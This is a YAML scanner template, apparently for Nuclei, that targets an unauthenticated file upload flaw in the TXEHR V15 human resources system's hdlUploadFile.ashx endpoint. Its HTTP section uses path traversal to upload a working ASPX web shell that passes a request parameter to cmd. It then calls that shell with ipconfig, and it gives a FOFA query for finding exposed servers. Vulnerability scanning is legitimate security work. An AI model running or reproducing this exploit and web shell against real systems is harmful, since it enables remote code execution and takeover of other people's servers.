id: tosharesoft-MobileService-web-UploadHandler-fileupload
info:
  name: 同享人力管理管理平台 TXEHR V15 hdlUploadFile.ashx - fileupload
  author: leadlife
  severity: critical
  description: 同享人力资源管理系统-TXEHR V15 hdlUploadFile.ashx 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference: 
    - https://github.com/wy876/POC/blob/02ac90075317fcc0cacfb84ea681079b0892a174/%E5%90%8C%E4%BA%AB%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FhdlUploadFile.ashx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: false
    max-request: 1
    fofa-query: body="/Assistant/Default.aspx"
  tags: tosharesoft,fileupload

variables:
    num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/rce HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
        Connection: close
        
        -----------------------------142851345723692939351758052805
        Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
        Content-Type: text/plain
        
        <%@ Page Language="Jscript" validateRequest="false" %>
        <%
        var c=new System.Diagnostics.ProcessStartInfo("cmd");
        var e=new System.Diagnostics.Process();
        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
        c.UseShellExecute=false;
        c.RedirectStandardOutput=true;
        c.RedirectStandardError=true;
        e.StartInfo=c;
        c.Arguments="/c " + Request.Item["cmd"];
        e.Start();
        out=e.StandardOutput;
        EI=e.StandardError;
        e.Close();
        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
        System.IO.File.Delete(Request.PhysicalPath);
        Response.End();%>
        -----------------------------142851345723692939351758052805--
      
      - |
        GET /Style/rce.aspx?cmd=ipconfig HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'Windows IP')
        condition: and

# cmd=whoami